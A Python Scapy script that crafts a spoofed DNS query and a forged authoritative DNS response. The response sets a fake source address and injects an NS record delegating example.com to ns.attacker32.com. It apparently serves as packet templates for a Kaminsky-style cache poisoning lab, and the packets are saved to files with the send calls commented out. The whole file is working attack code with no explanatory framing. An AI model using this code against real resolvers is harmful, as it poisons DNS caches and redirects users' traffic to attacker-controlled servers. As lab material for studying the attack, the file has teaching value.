#!/usr/bin/python3

from scapy.all import *

def generate_request_packet():
    # Craft the DNS request packet
    ip_pkt = IP(src='1.2.3.4', dst='10.9.0.53')
    udp_pkt = UDP(sport=54321, dport=53, chksum=0)
    qname = 'abcde.example.com'
    dns_qd = DNSQR(qname=qname)
    dns_pkt = DNS(id=0xBBBB, qr=0, qdcount=1, qd=dns_qd)
    request_pkt = ip_pkt / udp_pkt / dns_pkt
    return request_pkt

def generate_response_packet():
    # Craft the DNS response packet
    ip_pkt = IP(src='199.43.135.53', dst='10.9.0.53', chksum=0)
    udp_pkt = UDP(sport=53, dport=33333, chksum=0)
    qname = 'abcde.example.com'
    domain = 'example.com'
    dns_qd = DNSQR(qname=qname)
    dns_an = DNSRR(rrname=qname, type='A', rdata='1.2.3.4', ttl=259200)
    dns_ns = DNSRR(rrname=domain, type='NS', rdata='ns.attacker32.com', ttl=259200)
    dns_pkt = DNS(id=0xBBBB, aa=1, ra=0, rd=0, cd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=dns_qd, an=dns_an, ns=dns_ns)
    response_pkt = ip_pkt / udp_pkt / dns_pkt
    return response_pkt
   

def main():
    # Generate the DNS request packet and save it to a file
    request_pkt = generate_request_packet()
    with open('ip_req.bin', 'wb') as f:
        f.write(bytes(request_pkt))
    request_pkt.show()
    #send(request_pkt)

    # Generate the DNS response packet and save it to a file
    response_pkt = generate_response_packet()
    with open('ip_resp.bin', 'wb') as f:
        f.write(bytes(response_pkt))
    response_pkt.show()
    #send(response_pkt)



if __name__ == '__main__':
    main()